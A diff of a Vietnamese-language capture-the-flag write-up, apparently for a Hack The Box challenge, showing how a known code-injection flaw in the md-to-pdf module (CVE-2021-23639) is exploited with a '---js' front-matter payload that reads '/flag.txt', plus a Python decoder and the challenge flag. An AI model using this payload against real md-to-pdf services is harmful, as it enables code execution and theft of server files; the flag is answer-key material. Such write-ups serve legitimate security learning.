@@ -52,21 +52,26 @@ const { mdToPdf }    = require('md-to-pdf')
 
 Và ở file `package.json` ta biết được version: `{md-to-pdf": "4.1.0"}`
 
-Làm vài đường google ta tìm được RCE RCE vulnerability của module *md-to-pdf*(CVE-2021–23639): https://github.com/simonhaenisch/md-to-pdf/issues/99
+Làm vài đường google ta tìm được RCE vulnerability của module *md-to-pdf*(CVE-2021–23639): https://github.com/simonhaenisch/md-to-pdf/issues/99
 
-Ở comment ta nhặt được payload:
+Ở comment ta nhặt được payload, edit payload để đọc file:
 ```
 ---js
 {
-    css: `body::before { content: "${require('fs').readFile('/flag.txt')}"; display: block }`,
+    css: `body::before { content: "${require('fs').readFileSync('/flag.txt').join()}"; display: block }`,
 }
 ---
 ```
 Ở đây ta inject đoạn code được đọc dưới dạng code `nodejs` khi nằm trong tag `---js` từ đó đọc được file `/flag.txt`
 
-????/
+Ta được đoạn ascii code của flag, convert sang text bằng python thôi
+```python
+a = [72,84,66,123,105,110,116,51,114,71,52,108,52,99,55,105,67,95,114,49,100,51,95,48,110,95,98,108,49,110,107,51,114,95,102,108,117,49,100,53,125]
 
-**flag**: `pass`
+for b in a:
+	print(chr(b), end='')	
+```
+**flag**: `HTB{int3rG4l4c7iC_r1d3_0n_bl1nk3r_flu1d5}`
 
 ## Admidst Us
 
